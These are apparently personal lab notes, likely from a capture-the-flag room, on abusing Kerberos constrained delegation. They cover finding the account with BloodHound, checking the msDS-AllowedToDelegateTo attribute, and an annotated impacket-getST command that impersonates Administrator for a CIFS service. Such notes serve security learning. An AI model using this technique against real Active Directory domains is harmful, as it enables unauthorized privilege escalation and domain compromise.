=> https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13
- We find a user having privs. for this **using bloodhound**
- ![[Pasted image 20250820012032.png]]
## Attack Steps
---
We start looking for the constrained delegation accounts by checking the **`msDS-AllowedToDelegateTo`** attribute in the accounts details. The attribute lists the services allowed for delegation

```bash
impacket-getST -spn 'cifs/HayStack.thm.corp' -impersonate 'Administrator' -altservice 'cifs' 'thm.corp/DARLA_WINTERS'

DARLA_WINTERS -> Our controlled account / we can give hash instead of pass as well
Impersonate -> Administrator
First CIFS -> Actual resource name, Second CIFS -> To alter/change
```